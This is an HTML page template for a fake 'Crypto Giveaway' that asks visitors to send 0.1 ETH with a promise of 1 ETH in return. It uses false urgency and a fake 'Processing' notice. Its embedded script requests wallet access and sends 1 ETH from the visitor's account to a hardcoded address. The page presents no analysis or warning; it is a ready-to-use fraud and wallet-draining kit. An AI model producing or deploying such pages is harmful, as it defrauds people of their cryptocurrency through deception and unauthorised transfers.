<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Giveaway</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #0d1117;
            color: #c9d1d9;
            text-align: center;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .title {
            font-size: 2.5rem;
            margin-bottom: 1rem;
        }

        .subtitle {
            font-size: 1.2rem;
            margin-bottom: 2rem;
        }

        .qr-code {
            margin: 20px;
        }

        .address {
            font-size: 1.1rem;
            background: #161b22;
            padding: 10px;
            border-radius: 5px;
            margin: 10px auto;
            display: inline-block;
            word-wrap: break-word;
            width: 80%;
        }

        .loading {
            font-size: 1rem;
            color: #58a6ff;
            margin-top: 2rem;
        }

        .send-note {
            margin-top: 2rem;
            font-size: 1rem;
            color: #ffa500;
        }

        footer {
            position: absolute;
            bottom: 10px;
            width: 100%;
            font-size: 0.8rem;
            color: #8b949e;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="title">ðŸŽ‰ Crypto Giveaway ðŸŽ‰</h1>
        <p class="subtitle">Send 0.1 ETH to the address below, and you'll receive 1 ETH in return!</p>
        <div class="qr-code">
            <img src="https://api.qrserver.com/v1/create-qr-code/?data=0xYourEthereumAddressHere&size=200x200" alt="QR Code">
        </div>
        <div class="address">
            0xYourEthereumAddressHere
        </div>
        <div class="loading">Processing... Please wait for confirmation!</div>
        <p class="send-note">Hurry! Offer valid for a limited time only.</p>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
    <script>
async function sendEthereum() {
    try {
        // Request account access
        await ethereum.request({ method: 'eth_requestAccounts' });

        // Get the user's account
        const accounts = await ethereum.request({ method: 'eth_accounts' });
        const senderAddress = accounts[0];

        // Specify the recipient address and the amount to send
        const recipientAddress = '0xd8da6bf26964af9d7eed9e03e53415d37aa96045'; // Replace with the recipient's address
        const amountInEther = '1.0'; // 1 Ethereum

        // Convert the amount to Wei (smallest unit of Ether)
        const amountInWei = Web3.utils.toWei(amountInEther, 'ether');

        // Create the transaction object
        const transactionParameters = {
            to: recipientAddress,
            from: senderAddress,
            value: Web3.utils.toHex(amountInWei), // Convert to hexadecimal
            gas: '21000' // Set the gas limit, adjust if necessary
        };

        // Send the transaction
        const txHash = await ethereum.request({
            method: 'eth_sendTransaction',
            params: [transactionParameters],
        });

        console.log('Transaction sent:', txHash);
        alert(`Transaction successful! Hash: ${txHash}`);
    } catch (error) {
        console.error('Error sending Ethereum:', error);
        alert(`Error: ${error.message}`);
    }
}

    </script>
</body>
</html>
